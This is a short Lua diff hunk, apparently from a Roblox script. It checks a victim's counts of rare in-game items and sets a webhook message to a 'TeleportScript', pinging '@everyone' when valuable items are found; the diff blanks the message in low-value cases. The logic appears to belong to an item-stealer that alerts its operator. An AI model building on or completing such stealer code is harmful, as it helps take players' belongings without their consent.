@@ -377,9 +377,9 @@ if InvaildWebhook then
 end
 
 if Vintage == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Config.GoodItemsOnly then
-    content = TeleportScript
+    content = ""
 elseif Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
-    content = TeleportScript
+    content = ""
 else
     content = "-- @everyone\n" .. TeleportScript
 end
